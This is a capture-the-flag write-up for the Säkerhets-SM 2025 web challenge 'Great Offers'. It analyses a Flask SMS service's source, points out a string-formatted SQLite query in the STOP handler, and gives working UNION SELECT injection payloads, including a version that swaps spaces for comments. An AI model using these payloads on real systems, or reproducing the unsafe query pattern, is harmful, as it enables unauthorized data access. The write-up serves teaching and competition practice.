---
title: Great Offers
date: 2025-01-19 22:00:00
tags: [web, python, flask, Säkerhets-SM 2025]
draft: false
heroImage: ./assets/sakerhets-sm.png
---

<style>
.basis-1\/5{flex-basis: 5% !important;}
.max-w-prose{max-width: 100ch !important;}
.prose{max-width: 100ch !important;}
</style>

# Great Offers

```
I got some really annoying spam SMS the other day. 
It seems to be coming from this service. 
Can you take a look and maybe get them to stop sending me stuff?

https://great-offers.ctfchall.se:50000/
```


## Initial look
I usually first look through what language, framework and libraries are relevant in the challenge.

We get 4 files with this task:
* app.py
* requirements.txt
* index.html
* Dockerfile

From the extension **.py** we know it's running python. 

In the requirements.txt we get to know it's a flask application running with gunicorn and uses requests library.

```
flask
gunicorn
requests
```

Flask can have many different types of vulnerabilities, so it's not clear yet without opening up the source code.

```python
import ipaddress
import logging
import os
import secrets
import sqlite3
import urllib.parse
import uuid
from datetime import datetime

import requests
from flask import Flask, request, current_app, g, render_template
```

Looking at imports is useful to quickly see what the application uses.
The thing that stands out are os, secrets, sqlite3 and ipaddress.

We can assume that it will handle ipaddresses, and store some sort of data in the sqlite3 database.

## Looking at source code
Since it's flask, we first will try to get an overview of the endpoints. 
To find endpoints you can filter on "@app.route" for flask to find them in the source code.

```python
@app.route("/sms", methods=["POST"])
def receive_sms():
requester_address = ipaddress.ip_address(request.remote_addr)
if not any(requester_address in network for network in ALLOWED_SMS_IPS):
	log.warning(
	'Got SMS request from unauthorized client at "%s"', requester_address
	)
	return {"status": "error", "error": "Unauthorized sender"}, 403
else:
	log.info('Got SMS from authorized sender at "%s"', requester_address)
...

@app.route("/")
def index():
	number = current_app.config["SMS_API_NUMBER"]
	return render_template("index.html", number=number)
```

We have two routes, one that we might be able to control but seems to do some sort of ip check, and has name receive sms?

So the next thing we need to check is what kind of allowed_ips are there to see what can access it?

```python
ALLOWED_SMS_IPS = [
# 46Elk addresses
ipaddress.ip_network("176.10.154.199/32"),
ipaddress.ip_network("85.24.146.132/32"),
ipaddress.ip_network("185.39.146.243/32"),
ipaddress.ip_network("2001:9b0:2:902::199/128"),

# Localhost
ipaddress.ip_network("127.0.0.0/8"),
ipaddress.ip_network("::1/128"),

# Docker network ranges
ipaddress.ip_network("172.17.0.0/16"),
ipaddress.ip_network("172.18.0.0/16"),
ipaddress.ip_network("172.19.0.0/16"),
ipaddress.ip_network("172.20.0.0/14"),
ipaddress.ip_network("172.24.0.0/14"),
ipaddress.ip_network("172.28.0.0/14"),
ipaddress.ip_network("192.168.0.0/16"),
]
```

So if we assume that there is no way to bypass, we can see that docker, localhost and 46Elk can access the endpoint? We can understand docker and Localhost, but what about 46Elk?

Lets do a quick Google search for what 46Elk is?
```
Integrate the 46elks' API for SMS, MMS and phone calls into your applications with just a few lines of code. Transparent pricing, no startup fees, no minimum monthly costs.
```
From the name of the endpoint, it's most likely that endpoint is for 46elk and that we can send a SMS to the phone number.

This is what we get from index endpoint

```
Great Deals and Offers!
To sign up for our great deals and offers, 
send an SMS to +46XXXXXXXXX with the text SUBSCRIBE followed by your name.
```

## Where is the flag?
We have an overview of the challenge and now need to see what our goal is to get the flag.

By doing a quick search in VSCode I find this

```python
OFFERS = [
	("MEGA DEAL! 100% off Ghidra 11.2.1!", 0),
	("WOW DEAL! 50% off Binary Ninja! (Only for residents of Vatican City)", 0),
	("GIGA DEAL! BUY 2, PAY FOR 3 on select IDA Pro licenses!", 0),
	(f"PREMIUM DEAL! FREE FLAG WITH COUPON: {FLAG}", 1),
	("INCREDIBLE DEAL! $0 off Burp Suite Pro", 0),
	("UNBELIEVABLE DEAL! FREE offers when signing up for offers!", 0),
]
```

So the goal seems to get the offer that has the flag, that is the only one with a 1 beside it.

```python
def init_db(conn: sqlite3.Connection) -> None:
...
...
...
offers_insert = [
	(
	uuid.uuid4().hex,
	offer_text,
	offer_premium,
	int(datetime.now().timestamp()),
	)
	for offer_text, offer_premium in OFFERS
]
for offer in offers_insert:
	conn.execute(
	"INSERT INTO offers (id, offer, is_premium, created_at) VALUES (?,?,?,?)",
	offer,
	)
```

Looking at the init_db function, we see that it inserts the offers from the list.
The 1 on the flag offer, seems to indicate that it's a premium feature that we need access to.

After doing a quick search on "is_premium" and found no code that allows us to get it.

So we can assume that there is an SQL injection somewhere.

## Backend logic
Lets see what we can control, and if there is vulnerable code somewhere.

A good start is looking at what the receive_sms endpoint does.

First it parses the data from 46elk request and nothing seems out of the ordinary. 

Then it splits the message.

```python
sms_parts = sms_message.split(sep=None, maxsplit=1)

if len(sms_parts) == 1
	sms_parts.append("")

if len(sms_parts) != 2:
	log.warning("Invalid message format, ignoring")
	return {"status": "ok"}
```

So it seems to only allow 2 sms parts from splitting up the sms message it receives.

> Note: while I thought it only allowed one space. But looking back at code and seeing other solutions, the split has extra parameter that makes it only split once even if you have multiple spaces.

And then it assigns two variables from the array, and do a if condition check on the command.

```python
sms_command, sms_argument = sms_parts
if sms_command == "SUBSCRIBE":
	sms_handle_subscribe(sms_from, sms_argument)
elif sms_command == "STOP":
	sms_handle_stop(sms_from, sms_argument)
elif sms_command == "OFFER":
	sms_handle_offer(sms_from, sms_argument)
else:
	log.warning('Invalid message command "%s", ignoring', sms_command)
```


So we have possible 3 commands where we can control the output.

After looking at all 3 of them, they all seem to interact with the database in a safe way except for the STOP command.

```python
def sms_handle_stop(sender_number: str, arguments: str):
	db = db_connect()
	auth_code = arguments.strip()
	with db:
		cur = db.cursor()
		cur.execute(
		"SELECT * FROM subscribers WHERE auth_code = '%s'" % auth_code
		)
		subscriber = cur.fetchone()
```

It uses string formatting, instead of setting the parameters.

## SQL Injection
Lets try to see how we can use this.

```python
if not subscriber:
	send_sms(sender_number, "Invalid auth code. Please try again")
	return

with db:
	db.execute(
	"DELETE FROM subscribers WHERE auth_code = ? AND id = ?",
	(subscriber["auth_code"], subscriber["id"]),
	)

send_sms(sender_number,
f'Hello {subscriber["name"]}! You have been unsubscribed from our great offers and deals. To re-subscribe, simply send "SUBSCRIBE"',
)
```

The code checks if it returns a subscriber, and then sends the subscriber name in the template from the subscriber. We also see that it does not use subscriber number, but the number from who sent the message.

This looks like a perfect match for a union select injection, where it uses data from another table instead of the subscribers table.

By looking at the init_db code again, we can see how the tables are created.

They do not match up, but that shouldn't be a problem as we can still define data that is not from the other table in the union select. But it's a good thing that name and offer has same type.

```python
conn.execute(
"""
CREATE TABLE IF NOT EXISTS subscribers (
	id TEXT PRIMARY KEY,
	number TEXT UNIQUE NOT NULL,
	name TEXT NOT NULL,
	auth_code TEXT UNIQUE NOT NULL,
	is_premium INTEGER NOT NULL DEFAULT 0,
	registered_at INTEGER NOT NULL
)
"""
)

conn.execute(
"""
CREATE TABLE IF NOT EXISTS offers (
	id TEXT PRIMARY KEY,
	offer TEXT NOT NULL,
	is_premium INTEGER NOT NULL,
	created_at INTEGER NOT NULL
)
"""
)
```

Here is the injection I came up with

```sql
UNION SELECT ID, '1', offer, '1', false, 0 FROM offers where is_premium = 1 --
```

We follow the table format to subscriber when doing union select. So it's in the order
id, number, name, auth_code, is_premium, and registered_at.

Union select is very flexible and allows us to define values that are not from the offers table, such as number, auth_code. I used false and 0 at end to shorten the exploit.

In the end the query sent to the database will be

```sql
SELECT * FROM subscribers WHERE auth_code = '' UNION SELECT ID, '1', offer, '1', false, 0 FROM offers where is_premium = 1 -- '
```

Since it finds no subscribers with empty auth_code, it will use the element from union select. 

## Extra

Because I missed a step earlier, I thought the payload had to be without spaces.
So this is useful tip if you are restricted.

It's possible to use C-style comments instead of spaces, and for sqlite that is ``/**/``

So the final payload i used was

```
STOP '/**/union/**/select/**/id,/**/'1',/**/offer,/**/'1',/**/false,/**/0/**/from/**/offers/**/where/**/is_premium/**/=/**/1/**/--
```